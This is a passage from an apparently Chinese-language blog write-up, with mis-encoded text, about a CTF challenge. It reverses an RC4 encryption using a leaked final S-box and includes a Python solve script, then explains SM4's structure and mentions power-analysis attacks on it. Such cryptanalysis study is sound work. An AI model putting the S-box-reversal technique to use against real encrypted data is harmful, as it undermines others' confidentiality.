class="keyword">self</span>.oO<span class="number">0</span>] = <span class="keyword">self</span>.O<span class="number">0</span>[<span class="keyword">self</span>.oO<span class="number">0</span>], <span class="keyword">self</span>.O<span class="number">0</span>[i]</span><br><span class="line">        <span class="keyword">self</span>.Ooo = <span class="keyword">self</span>.oO<span class="number">0</span> = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">OO0o</span><span class="params">(<span class="keyword">self</span>, length)</span></span><span class="symbol">:</span></span><br><span class="line">        O = []</span><br><span class="line">        <span class="keyword">for</span> <span class="number">_</span> <span class="keyword">in</span> range(length)<span class="symbol">:</span></span><br><span class="line">            <span class="keyword">self</span>.Ooo = ( <span class="keyword">self</span>.Ooo + <span class="number">1</span> ) % <span class="number">256</span></span><br><span class="line">            <span class="keyword">self</span>.oO<span class="number">0</span> = ( <span class="keyword">self</span>.oO<span class="number">0</span> + <span class="keyword">self</span>.O<span class="number">0</span>[<span class="keyword">self</span>.Ooo] ) % <span class="number">256</span></span><br><span class="line">            <span class="keyword">self</span>.O<span class="number">0</span>[<span class="keyword">self</span>.Ooo], <span class="keyword">self</span>.O<span class="number">0</span>[<span class="keyword">self</span>.oO<span class="number">0</span>] = <span class="keyword">self</span>.O<span class="number">0</span>[<span class="keyword">self</span>.oO<span class="number">0</span>], <span class="keyword">self</span>.O<span class="number">0</span>[<span class="keyword">self</span>.Ooo]</span><br><span class="line">            t = ( <span class="keyword">self</span>.O<span class="number">0</span>[<span class="keyword">self</span>.Ooo] + <span class="keyword">self</span>.O<span class="number">0</span>[<span class="keyword">self</span>.oO<span class="number">0</span>] ) % <span class="number">256</span></span><br><span class="line">            O.append( <span class="keyword">self</span>.O<span class="number">0</span>[t] )</span><br><span class="line">        print(<span class="keyword">self</span>.O<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> O</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(s1, s2)</span></span><span class="symbol">:</span></span><br><span class="line">    <span class="keyword">return</span> bytes(map( (lambda <span class="symbol">x:</span> x[<span class="number">0</span>]^x[<span class="number">1</span>]), zip(s1, s2) ))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span><span class="params">(msg)</span></span><span class="symbol">:</span></span><br><span class="line">    Oo0oO = Oo<span class="number">0</span>()</span><br><span class="line">    Oo0oO.OO<span class="number">0</span>( md5(msg).digest()[<span class="symbol">:</span><span class="number">8</span>] )</span><br><span class="line">    O0O = Oo0oO.OO0o( len(msg) )</span><br><span class="line">    <span class="keyword">return</span> xor(msg, O0O)</span><br><span class="line"></span><br><span class="line">print( enc(flag) )</span><br><span class="line"></span><br><span class="line"><span class="comment"># [157, 28, 118, 120, 251, 242, 69, 178, 165, 137, 115, 84, 250, 152, 56, 196, 191, 16, 71, 158, 1, 58, 233, 175, 214, 181, 42, 151, 255, 228, 38, 48, 186, 139, 201, 24, 30, 134, 162, 86, 187, 176, 121, 206, 153, 111, 161, 163, 26, 27, 14, 188, 96, 3, 52, 207, 57, 8, 145, 154, 238, 221, 85, 204, 66, 141, 143, 237, 113, 53, 218, 29, 177, 150, 87, 94, 183, 130, 200, 12, 182, 166, 205, 93, 252, 44, 77, 76, 55, 81, 208, 128, 6, 109, 156, 129, 103, 59, 105, 25, 75, 31, 164, 232, 132, 209, 159, 2, 194, 131, 116, 32, 19, 36, 4, 125, 108, 212, 170, 171, 248, 236, 126, 195, 174, 65, 215, 160, 91, 64, 172, 167, 13, 169, 68, 92, 20, 10, 142, 106, 23, 192, 67, 88, 253, 202, 184, 22, 249, 122, 62, 107, 123, 45, 148, 51, 100, 245, 190, 231, 220, 241, 213, 50, 70, 219, 39, 244, 82, 189, 37, 72, 119, 40, 234, 224, 80, 235, 18, 61, 198, 90, 60, 98, 95, 179, 54, 254, 74, 226, 180, 230, 211, 99, 239, 83, 144, 240, 34, 199, 35, 7, 210, 149, 112, 41, 101, 225, 168, 33, 63, 216, 79, 243, 17, 138, 97, 147, 11, 229, 222, 0, 9, 78, 49, 21, 155, 124, 135, 193, 197, 223, 5, 110, 246, 247, 104, 203, 89, 117, 140, 114, 136, 185, 15, 46, 173, 102, 73, 47, 217, 43, 146, 133, 127, 227]</span></span><br><span class="line"><span class="comment"># b'\x14\xe3s,\xcbq\xa8\xd1\x86\x12\xba\x9f\x88\xa9J&#125;\xf5\xd8BF\x93x\x94\x8a\xdc\xdb\xa0\xb9O0SeJ^\xc7\xce\xcf\xe3\x1c\x10s\xe2\xb6\xceA\xfd\xd6\x87\x95W'</span></span><br></pre></td></tr></table></figure><p>ç¨‹åºå¯¹å‡½æ•°ååšäº†ä¸€äº›æ··æ·†ï¼Œæ¢å¤ä¹‹åä¸éš¾çœ‹å‡ºå…¶å®å°±æ˜¯RC4çš„åŠ å¯†æµç¨‹</p><p>åˆ©ç”¨å‰é¢æåˆ°çš„75å°æ—¶ç ´è§£RC4çš„æ”»å‡»æ–¹æ³•ç ´è§£æ˜æ–‡æ˜¾ç„¶ä¸ä¼šæ˜¯é¢˜ç›®çš„æœ¬æ„ï¼Œæ¯•ç«Ÿé‚£æ–¹æ³•è§£å¯†çš„æ—¶é—´æ˜¯ä»¥å°æ—¶ä¸ºå•ä½çš„ã€‚</p><p>å¯ä»¥å‘ç°ï¼Œæœ¬é¢˜ä¸ä»…ç»™å‡ºäº†å¯†æ–‡ï¼Œè¿˜ç»™å‡ºäº†åŠ å¯†å®Œæˆä¹‹åSç›’çš„å†…å®¹ï¼Œçªç ´ç‚¹æ— ç–‘æ˜¯è¿™é‡Œäº†ã€‚</p><h3 id="è§£å¯†"><a href="#è§£å¯†" class="headerlink" title="è§£å¯†"></a>è§£å¯†</h3><p>æˆ‘ä»¬çœ‹åˆ°RC4æœ€åçš„åŠ å¯†ç®—æ³•éƒ¨åˆ†</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="built_in">i</span> in range(len(message))</span><br><span class="line">    <span class="built_in">i</span> = (<span class="built_in">i</span> + <span class="number">1</span>)<span class="comment">%256 </span></span><br><span class="line">    <span class="built_in">j</span> = (<span class="built_in">j</span> + s[<span class="built_in">i</span>])<span class="comment">%256</span></span><br><span class="line">    s[<span class="built_in">i</span>],s[<span class="built_in">j</span>] = s[<span class="built_in">j</span>],s[<span class="built_in">i</span>]</span><br><span class="line">    t = (s[<span class="built_in">i</span>] + s[<span class="built_in">j</span>])<span class="comment">%256</span></span><br><span class="line">    cipher += message[<span class="built_in">i</span>]^s[t]</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæˆ‘ä»¬å¯ä»¥ç¡®å®šçš„æ˜¯ï¼ŒRC4æ—¢ç„¶æ˜¯æŒ‰å­—èŠ‚åŠ å¯†ã€‚é‚£ä¹ˆæ˜æ–‡å’Œå¯†æ–‡çš„é•¿åº¦ä¾¿æ˜¯ä¸€è‡´çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¾¿å¯ä»¥ç¡®å®šåŠ å¯†éƒ¨åˆ†ç»è¿‡äº†å‡ æ¬¡å¾ªç¯ã€‚</p><p>å…¶æ¬¡ï¼Œä¸å¸¸è§„è§£å¯†ä¸åŒçš„æ˜¯ï¼Œæˆ‘ä»¬æ˜¾ç„¶çŸ¥é“flagçš„æœ€åä¸€ä½å­—ç¬¦æ˜¯â€™}â€™,ç”±äºå¼‚æˆ–è¿ç®—çš„å¯¹åˆæ€§ï¼Œæˆ‘ä»¬å¼‚æˆ–å¯†æ–‡å’Œæ˜æ–‡çš„æœ€åä¸€ä½ï¼Œä¾¿å¯ä»¥å¾—åˆ°å¯†é’¥çš„æœ€åä¸€ä½ï¼Œï¼ˆå…¶å®å°±ç®—æœ€åä¸€ä½å­—ç¬¦ä¸ç¡®å®šï¼Œä¹Ÿæ˜¯å¯ä»¥æš´åŠ›éå†ä¸€ç™¾å¤šç§å¯èƒ½ï¼Œæ‰¾åˆ°å…¶ä¸­æœ‰æ„ä¹‰çš„å³å¯ï¼‰</p><p>çŸ¥é“å¯†é’¥çš„æœ€åä¸€ä½ï¼Œå³s[t]ï¼Œæˆ‘ä»¬å†æ ¹æ®æœ€åç»™å‡ºçš„Sç›’å°±èƒ½ç¡®å®štçš„å€¼ï¼Œ</p><p>æˆ‘ä»¬è¿˜çŸ¥é“içš„å€¼å°±ä»£è¡¨ç€å¾ªç¯çš„æ¬¡æ•°ï¼Œæ‰€ä»¥içš„å€¼ä¹Ÿæ˜¯ç¡®å®šçš„ã€‚</p><p> <strong>t = (s[i] + s[j])%256</strong>ï¼šSç›’ç¡®å®šï¼Œiç¡®å®šï¼Œtç¡®å®šï¼Œå› æ­¤jä¹Ÿæ˜¯å¯ä»¥æ¨å‡ºæ¥ã€‚</p><p>æ¨å‡ºjåï¼Œæˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œswap(s[i],[j])ï¼Œå°†Sç›’å˜å›å»ã€‚</p><p><strong>j = (j + s[i])%256</strong>ï¼šjæ¨å‡ºæ¥åï¼Œs[i]æ˜¯ç¡®å®šçš„ï¼Œæˆ‘ä»¬å°±èƒ½ç¡®å®šä¸Šä¸€è½®çš„jçš„å€¼</p><p>ç¡®å®šäº†ä¸Šä¸€è½®çš„jçš„å€¼ï¼Œiçš„å€¼ä¹Ÿæ˜¯ç¡®å®šçš„ï¼Œ<strong>t = (s[i] + s[j])%256</strong>ï¼Œè¿™æ ·å°±èƒ½ç¡®å®štçš„å€¼ï¼Œä»è€Œç¡®å®šs[t]ï¼Œå³å¯†é’¥çš„å€¼ï¼Œæœ‰äº†å¯†é’¥å°±èƒ½è§£å¯†å¯†æ–‡ï¼Œæ¨å‡ºæ˜æ–‡äº†ã€‚</p><p>ç„¶åå†åˆ©ç”¨s[i]ï¼Œä¸æ–­çš„æ¨å‡ºå‰é¢çš„jï¼Œå°±èƒ½ä¸æ–­çš„å€’æ¨å‡ºæ˜æ–‡äº†ã€‚æœ€åå°†æ˜æ–‡é€†åºä¸€ä¸‹ï¼Œå°±æ˜¯flagäº†ã€‚</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">enc=<span class="string">b'\x14\xe3s,\xcbq\xa8\xd1\x86\x12\xba\x9f\x88\xa9J&#125;\xf5\xd8BF\x93x\x94\x8a\xdc\xdb\xa0\xb9O0SeJ^\xc7\xce\xcf\xe3\x1c\x10s\xe2\xb6\xceA\xfd\xd6\x87\x95W'</span></span><br><span class="line">s= [<span class="number">157</span>, <span class="number">28</span>, <span class="number">118</span>, <span class="number">120</span>, <span class="number">251</span>, <span class="number">242</span>, <span class="number">69</span>, <span class="number">178</span>, <span class="number">165</span>, <span class="number">137</span>, <span class="number">115</span>, <span class="number">84</span>, <span class="number">250</span>, <span class="number">152</span>, <span class="number">56</span>, <span class="number">196</span>, <span class="number">191</span>, <span class="number">16</span>, <span class="number">71</span>, <span class="number">158</span>, <span class="number">1</span>, <span class="number">58</span>, <span class="number">233</span>, <span class="number">175</span>, <span class="number">214</span>, <span class="number">181</span>, <span class="number">42</span>, <span class="number">151</span>, <span class="number">255</span>, <span class="number">228</span>, <span class="number">38</span>, <span class="number">48</span>, <span class="number">186</span>, <span class="number">139</span>, <span class="number">201</span>, <span class="number">24</span>, <span class="number">30</span>, <span class="number">134</span>, <span class="number">162</span>, <span class="number">86</span>, <span class="number">187</span>, <span class="number">176</span>, <span class="number">121</span>, <span class="number">206</span>, <span class="number">153</span>, <span class="number">111</span>, <span class="number">161</span>, <span class="number">163</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">14</span>, <span class="number">188</span>, <span class="number">96</span>, <span class="number">3</span>, <span class="number">52</span>, <span class="number">207</span>, <span class="number">57</span>, <span class="number">8</span>, <span class="number">145</span>, <span class="number">154</span>, <span class="number">238</span>, <span class="number">221</span>, <span class="number">85</span>, <span class="number">204</span>, <span class="number">66</span>, <span class="number">141</span>, <span class="number">143</span>, <span class="number">237</span>, <span class="number">113</span>, <span class="number">53</span>, <span class="number">218</span>, <span class="number">29</span>, <span class="number">177</span>, <span class="number">150</span>, <span class="number">87</span>, <span class="number">94</span>, <span class="number">183</span>, <span class="number">130</span>, <span class="number">200</span>, <span class="number">12</span>, <span class="number">182</span>, <span class="number">166</span>, <span class="number">205</span>, <span class="number">93</span>, <span class="number">252</span>, <span class="number">44</span>, <span class="number">77</span>, <span class="number">76</span>, <span class="number">55</span>, <span class="number">81</span>, <span class="number">208</span>, <span class="number">128</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">156</span>, <span class="number">129</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">105</span>, <span class="number">25</span>, <span class="number">75</span>, <span class="number">31</span>, <span class="number">164</span>, <span class="number">232</span>, <span class="number">132</span>, <span class="number">209</span>, <span class="number">159</span>, <span class="number">2</span>, <span class="number">194</span>, <span class="number">131</span>, <span class="number">116</span>, <span class="number">32</span>, <span class="number">19</span>, <span class="number">36</span>, <span class="number">4</span>, <span class="number">125</span>, <span class="number">108</span>, <span class="number">212</span>, <span class="number">170</span>, <span class="number">171</span>, <span class="number">248</span>, <span class="number">236</span>, <span class="number">126</span>, <span class="number">195</span>, <span class="number">174</span>, <span class="number">65</span>, <span class="number">215</span>, <span class="number">160</span>, <span class="number">91</span>, <span class="number">64</span>, <span class="number">172</span>, <span class="number">167</span>, <span class="number">13</span>, <span class="number">169</span>, <span class="number">68</span>, <span class="number">92</span>, <span class="number">20</span>, <span class="number">10</span>, <span class="number">142</span>, <span class="number">106</span>, <span class="number">23</span>, <span class="number">192</span>, <span class="number">67</span>, <span class="number">88</span>, <span class="number">253</span>, <span class="number">202</span>, <span class="number">184</span>, <span class="number">22</span>, <span class="number">249</span>, <span class="number">122</span>, <span class="number">62</span>, <span class="number">107</span>, <span class="number">123</span>, <span class="number">45</span>, <span class="number">148</span>, <span class="number">51</span>, <span class="number">100</span>, <span class="number">245</span>, <span class="number">190</span>, <span class="number">231</span>, <span class="number">220</span>, <span class="number">241</span>, <span class="number">213</span>, <span class="number">50</span>, <span class="number">70</span>, <span class="number">219</span>, <span class="number">39</span>, <span class="number">244</span>, <span class="number">82</span>, <span class="number">189</span>, <span class="number">37</span>, <span class="number">72</span>, <span class="number">119</span>, <span class="number">40</span>, <span class="number">234</span>, <span class="number">224</span>, <span class="number">80</span>, <span class="number">235</span>, <span class="number">18</span>, <span class="number">61</span>, <span class="number">198</span>, <span class="number">90</span>, <span class="number">60</span>, <span class="number">98</span>, <span class="number">95</span>, <span class="number">179</span>, <span class="number">54</span>, <span class="number">254</span>, <span class="number">74</span>, <span class="number">226</span>, <span class="number">180</span>, <span class="number">230</span>, <span class="number">211</span>, <span class="number">99</span>, <span class="number">239</span>, <span class="number">83</span>, <span class="number">144</span>, <span class="number">240</span>, <span class="number">34</span>, <span class="number">199</span>, <span class="number">35</span>, <span class="number">7</span>, <span class="number">210</span>, <span class="number">149</span>, <span class="number">112</span>, <span class="number">41</span>, <span class="number">101</span>, <span class="number">225</span>, <span class="number">168</span>, <span class="number">33</span>, <span class="number">63</span>, <span class="number">216</span>, <span class="number">79</span>, <span class="number">243</span>, <span class="number">17</span>, <span class="number">138</span>, <span class="number">97</span>, <span class="number">147</span>, <span class="number">11</span>, <span class="number">229</span>, <span class="number">222</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">78</span>, <span class="number">49</span>, <span class="number">21</span>, <span class="number">155</span>, <span class="number">124</span>, <span class="number">135</span>, <span class="number">193</span>, <span class="number">197</span>, <span class="number">223</span>, <span class="number">5</span>, <span class="number">110</span>, <span class="number">246</span>, <span class="number">247</span>, <span class="number">104</span>, <span class="number">203</span>, <span class="number">89</span>, <span class="number">117</span>, <span class="number">140</span>, <span class="number">114</span>, <span class="number">136</span>, <span class="number">185</span>, <span class="number">15</span>, <span class="number">46</span>, <span class="number">173</span>, <span class="number">102</span>, <span class="number">73</span>, <span class="number">47</span>, <span class="number">217</span>, <span class="number">43</span>, <span class="number">146</span>, <span class="number">133</span>, <span class="number">127</span>, <span class="number">227</span>]</span><br><span class="line">t=s.index(ord(<span class="string">'&#125;'</span>)^ord(<span class="string">'W'</span>))  <span class="comment">#æ ¹æ®æœ€åä¸€ä½å¯†é’¥ï¼Œç¡®å®št</span></span><br><span class="line"></span><br><span class="line">i=<span class="number">50</span><span class="comment">#å¯†æ–‡é•¿åº¦ï¼Œä¹Ÿå°±æ˜¯åŠ å¯†ç»è¿‡çš„å¾ªç¯çš„è¶Ÿæ•°</span></span><br><span class="line">sj=(t-s[i])%<span class="number">256</span></span><br><span class="line">j=s.index(sj)   <span class="comment">#æ ¹æ®tå’Œs[i]çš„å€¼ï¼Œç¡®å®šjçš„å€¼</span></span><br><span class="line">s[i],s[j]=s[j],s[i]<span class="comment">#è·å–ä¸Šä¸€è½®sç›’</span></span><br><span class="line">j=(j-s[i])%<span class="number">256</span><span class="comment">#æ¢å¤å‰ä¸€ä¸ªjçš„å€¼</span></span><br><span class="line">i=i<span class="number">-1</span><span class="comment">#iä¹Ÿéšç€å€’æ¨è€Œå‡å°‘</span></span><br><span class="line">t=(s[i]+s[j])%<span class="number">256</span><span class="comment">#å€’æ•°ç¬¬äºŒè½®çš„iå€¼ï¼Œjå€¼ï¼ŒSç›’éƒ½ç¡®å®šäº†ï¼Œå°±å¯ä»¥æ¨å‡ºtçš„å€¼ï¼Œä»è€Œè·å¾—å¯†é’¥åˆ°æ•°ç¬¬äºŒä½</span></span><br><span class="line">flag=<span class="string">'&#125;'</span></span><br><span class="line"><span class="keyword">while</span> i&gt;<span class="number">0</span>:</span><br><span class="line">    flag+=(chr((enc[i<span class="number">-1</span>])^s[t]))<span class="comment">#è§£å¯†å¯†æ–‡</span></span><br><span class="line">    s[i],s[j]=s[j],s[i]<span class="comment">#è·å–ä¸Šä¸€è½®Sç›’.....å¦‚æ­¤å¾ªç¯</span></span><br><span class="line">    j=(j-s[i])%<span class="number">256</span></span><br><span class="line">    i=i<span class="number">-1</span></span><br><span class="line">    t=(s[i]+s[j])%<span class="number">256</span></span><br><span class="line"></span><br><span class="line">flag=flag[::<span class="number">-1</span>]</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h1 id="SM4"><a href="#SM4" class="headerlink" title="SM4"></a>SM4</h1><p>å‰é¢æŒ‰ä½åŠ å¯†çš„RC4ç”±äºç®—æ³•å¼±ç‚¹å·²ç»è¢«åœç”¨äº†ï¼Œè€Œä½œä¸ºæˆ‘å›½çš„åˆ†ç»„å¯†ç æ ‡å‡† SM4åœ¨ç®—æ³•ä¸Šç›®å‰è¿˜æ²¡æœ‰è¢«ç ´è§£ã€‚ï¼ˆä½†ä»æ—§é¢ä¸´å·®åˆ†åŠŸè€—æ”»å‡»çš„å¨èƒï¼‰</p><h2 id="SM4ç®€ä»‹"><a href="#SM4ç®€ä»‹" class="headerlink" title="SM4ç®€ä»‹"></a>SM4ç®€ä»‹</h2><p>SM4æ˜¯ä¸€ç§åˆ†ç»„å¯†ç ç®—æ³•ï¼Œåˆ†ç»„é•¿åº¦ä¸º128bitï¼Œå¯†é’¥é•¿åº¦ä¹Ÿä¸º128bitã€‚åŠ è§£å¯†ç®—æ³•ç»“æ„ç›¸åŒï¼Œè½®å¯†é’¥çš„ä½¿ç”¨æ¬¡åºåˆ™ç›¸åã€‚åŠ å¯†ç®—æ³•å’Œè§£å¯†ç®—æ³•ä»¥åŠå¯†é’¥æ‹“å±•ç®—æ³•å‡é‡‡ç”¨äº†32è½®çš„éçº¿æ€§è¿­ä»£ç»“æ„ </p><h2 id="SM4åŠ å¯†æµç¨‹"><a href="#SM4åŠ å¯†æµç¨‹" class="headerlink" title="SM4åŠ å¯†æµç¨‹"></a>SM4åŠ å¯†æµç¨‹</h2><p><img src="https://i.loli.net/2020/04/30/T9Nm8teudHM3cKG.png" alt="SM4åŠ å¯†æµç¨‹"></p><p>å…¶ä¸­æ˜æ–‡è¢«åˆ†æˆå››ç»„ï¼Œæ¯ä¸€ç»„32bitå³4å­—èŠ‚ã€‚ç„¶ååŠ ä¸Šè½®å¯†é’¥è¿›è¡Œä¸€æ¬¡è½®å‡½æ•°Fè¿ç®—ï¼Œ</p><p>$X_{i+4}=F(X_i,X_{i+1},X_{i+2},X_{i+3},rK_i)=X_i âŠ• T( X_{i+1}âŠ•X_{i+2}âŠ•X_{i+3}âŠ•rK_i)$</p><h3 id="è½®å‡½æ•°Fï¼š"><a href="#è½®å‡½æ•°Fï¼š" class="headerlink" title="è½®å‡½æ•°Fï¼š"></a>è½®å‡½æ•°Fï¼š</h3><h4 id="å…¶ä¸­Tå‡½æ•°ï¼š"><a href="#å…¶ä¸­Tå‡½æ•°ï¼š" class="headerlink" title="å…¶ä¸­Tå‡½æ•°ï¼š"></a>å…¶ä¸­Tå‡½æ•°ï¼š</h4><p>T(x)=L(Ï„(x))</p><h4 id="å…¶ä¸­Ï„æ˜¯éçº¿æ€§å˜æ¢ï¼š"><a href="#å…¶ä¸­Ï„æ˜¯éçº¿æ€§å˜æ¢ï¼š" class="headerlink" title="å…¶ä¸­Ï„æ˜¯éçº¿æ€§å˜æ¢ï¼š"></a>å…¶ä¸­Ï„æ˜¯éçº¿æ€§å˜æ¢ï¼š</h4><p>â€‹        Ï„ç”±å››ä¸ªå¹¶è¡Œçš„Sç›’æ„æˆã€‚</p><p>â€‹        è®¾è¾“å…¥ä¸ºAï¼Œè¾“å‡ºä¸º B(4å­—èŠ‚)</p><p>â€‹        $B =ï¼ˆb_0,b_1,b_2,b_3ï¼‰= Ï„(A)=(Sbox(a_0),Sbox(a_0),Sbox(a_0),Sbox(a_0))$</p><p><img src="https://i.loli.net/2020/04/30/MbhwxpYAZfjrVWu.png" alt="Sbox"></p><h4 id="å…¶ä¸­Lå‡½æ•°ï¼š"><a href="#å…¶ä¸­Lå‡½æ•°ï¼š" class="headerlink" title="å…¶ä¸­Lå‡½æ•°ï¼š"></a>å…¶ä¸­Lå‡½æ•°ï¼š</h4><p>â€‹        è¾“å…¥ä¸ºéçº¿æ€§å˜æ¢çš„è¾“å‡ºï¼Œè®¾è¾“å‡ºä¸ºC</p><p>â€‹        $C = L(B) = B âŠ•ï¼ˆB&lt;&lt;&lt;2ï¼‰ âŠ•(B&lt;&lt;&lt;10) âŠ•(B&lt;&lt;&lt;18) âŠ•(B&lt;&lt;&lt;24)        $ï¼ˆéœ€è¦è¯´æ˜çš„æ˜¯è¿™é‡Œè¿›è¡Œçš„æ˜¯å¾ªç¯ä½ç§»æ“ä½œï¼‰</p><h3 id="å¯†é’¥æ‹“å±•ï¼š"><a href="#å¯†é’¥æ‹“å±•ï¼š" class="headerlink" title="å¯†é’¥æ‹“å±•ï¼š"></a>å¯†é’¥æ‹“å±•ï¼š</h3><h4 id="ç³»ç»Ÿå‚æ•°FK"><a href="#ç³»ç»Ÿå‚æ•°FK" class="headerlink" title="ç³»ç»Ÿå‚æ•°FK"></a>ç³»ç»Ÿå‚æ•°FK</h4><p>è®¾ç³»ç»Ÿå‚æ•°$FK  =  ï¼ˆFK_0,FK_1,FK_2,FK_3ï¼‰$</p><p><img src="https://i.loli.net/2020/04/30/21TFBa8mN4XfSwJ.png" alt="FK"></p><h4 id="å›ºå®šå‚æ•°CK"><a href="#å›ºå®šå‚æ•°CK" class="headerlink" title="å›ºå®šå‚æ•°CK"></a>å›ºå®šå‚æ•°CK</h4><p>è®¾å›ºå®šå‚æ•°$CK = ï¼ˆCK_0,CK_1,CK_2,CK_3ï¼‰$</p><p><img src="https://i.loli.net/2020/04/30/Ws5IuCyFMrifEjx.png" alt="CK"></p><h4 id="åŠ å¯†å¯†é’¥MK"><a href="#åŠ å¯†å¯†é’¥MK" class="headerlink" title="åŠ å¯†å¯†é’¥MK"></a>åŠ å¯†å¯†é’¥MK</h4><p>è®¾åŠ å¯†å¯†é’¥$MK=ï¼ˆMK_0,MK_1,MK_2,MK_3ï¼‰$ï¼ˆå†…å®¹éšä¾¿å®šä¹‰ï¼‰ï¼ˆ$MK_i$ä¸ºå››å­—èŠ‚ï¼Œæ‰€ä»¥å¯†é’¥ä¸º128bitï¼‰</p><h4 id="è½®å¯†é’¥rKi"><a href="#è½®å¯†é’¥rKi" class="headerlink" title="è½®å¯†é’¥rKi"></a>è½®å¯†é’¥rK<del>i</del></h4><p>é¦–å…ˆ$ï¼ˆK_0,K_1,K_2,K_3ï¼‰= ï¼ˆMK_0âŠ•FK_0, MK_1âŠ•, FK_1, MK_2âŠ•FK_2, MK_3âŠ•FK_3ï¼‰$</p><p>ç„¶åç”Ÿæˆè½®å¯†é’¥$rK_i=K_{i+4}=K_iâŠ•Tâ€™(K_{i+1}âŠ•K_{i+2}âŠ•K_{i+3}âŠ•CK_i)    (i=0,1,2,,,31)$</p><p>å…¶ä¸­Tâ€™ä¸ä¸Šæ–‡æåˆ°çš„Tå‡½æ•°å‡ ä¹ä¸€è‡´ï¼Œåªæ˜¯å°†å…¶ä¸­çš„Lå‡½æ•°æ”¹ä¸ºï¼š</p><p>$L`(B) = B âŠ•(B&lt;&lt;&lt;13)âŠ•(B&lt;&lt;&lt;23) $</p><p>å¯ä»¥çœ‹å‡ºåŠ å¯†æ˜¯ä¸€ç»„128bitï¼Œ16å­—èŠ‚ï¼Œä½†ä¸€è½®åªåŠ å¯†4å­—èŠ‚ï¼Œä¸€å…±è¿›è¡Œ32è½®åŠ å¯†ï¼Œæœ€åå°†ç»“æœé€†åºå¾—åˆ°å¯†æ–‡ã€‚</p><h2 id="SM4è§£å¯†æµç¨‹"><a href="#SM4è§£å¯†æµç¨‹" class="headerlink" title="SM4è§£å¯†æµç¨‹"></a>SM4è§£å¯†æµç¨‹</h2><p>ç”±äºå¼‚æˆ–è¿ç®—çš„å¯¹åˆæ€§ï¼š</p><p>å› ä¸º$X_{i+4}=F(X_i,X_{i+1},X_{i+2},X_{i+3~}rK_i)=X_i âŠ• T( X_{i+1}âŠ•X_{i+2}âŠ•X_{i+3}âŠ•rK_i)$</p><p>æ‰€ä»¥$X_i=F(X_{i+4},X_{i+1},X_{i+2},X_{i+3},rK_i)=X_{i+4} âŠ• T(X_{i+1}âŠ•X_{i+2}âŠ•X_{i+3}âŠ•rK_i)$</p><p>æ‰€ä»¥è§£å¯†æµç¨‹ä»…æ˜¯æ˜¯åŠ å¯†æµç¨‹çš„é€†åºï¼š</p><p>å…ˆå°†å¯†æ–‡é€†åºï¼Œç„¶åè½®å¯†é’¥ä¹Ÿè¦å€’ç€ç”¨$rK_31,rK_30,,,,rK_0$</p><p>åªä¸è¿‡åŠ å¯†æ—¶ï¼Œè½®å¯†é’¥çš„ç”Ÿæˆå’Œå¯†æ–‡çš„åŠ å¯†å¯ä»¥åŒæ­¥è¿›è¡Œï¼Œè€Œè§£å¯†æ—¶å°±è¦ä¸€æ¬¡æ€§å…ˆç”Ÿæˆå¥½æ‰€æœ‰çš„è½®å¯†é’¥ï¼Œç„¶åå€’ç€ç”¨ã€‚</p><h1 id="å·®åˆ†åŠŸè€—åˆ†ææ”»å‡»ï¼ˆDPAï¼‰"><a href="#å·®åˆ†åŠŸè€—åˆ†ææ”»å‡»ï¼ˆDPAï¼‰" class="headerlink" title="å·®åˆ†åŠŸè€—åˆ†ææ”»å‡»ï¼ˆDPAï¼‰"></a>å·®åˆ†åŠŸè€—åˆ†ææ”»å‡»ï¼ˆDPAï¼‰</h1><p>â€‹        ç°åœ¨çš„åˆ†ç»„å¯†ç ï¼ŒåŒ…æ‹¬SM4ï¼ŒAESç­‰ç®—æ³•ï¼Œéƒ½é¢ä¸´ç€å·®åˆ†åŠŸè€—æ”»å‡»çš„å¨èƒã€‚ é€šè¿‡åˆ©ç”¨è‡ªä¸»è®¾è®¡çš„åŠŸè€—æ”»å‡»å¹³å°é‡‡é›†SM4ç®—æ³•åŠ å¯†è¿‡ç¨‹ä¸­çš„åŠŸè€—æ›²çº¿ï¼Œå¹¶å¯¹é‡‡é›†å¥½çš„æ›²çº¿è¿›è¡Œå·®åˆ†å¤„ç†ï¼Œä»è€Œè·å¾—äº†SM4ç®—æ³•çš„å¯†é’¥ã€‚å®éªŒç»“æœè¡¨æ˜ï¼Œå½“é‡‡é›†400æ¡ä»¥ä¸ŠåŠŸè€—æ›²çº¿æ—¶ï¼Œå³æœ‰90%ä»¥ä¸Šçš„æ¦‚ç‡ç ´è§£å¯†é’¥ã€‚ </p><p>â€‹        å°½ç®¡ç®—æ³•æœ¬èº«æ²¡æœ‰å¼±ç‚¹ï¼Œä½†æ˜¯åŒ…æ‹¬å·®åˆ†åŠŸè€—æ”»å‡»åœ¨å†…çš„ä¾§ä¿¡é“æ”»å‡»å´æ˜¯ä¸ªå·¨å¤§å¨èƒ</p><p><a href="http://www.fx361.com/page/2018/0506/3480892.shtml" target="_blank" rel="noopener">æ–‡ç« 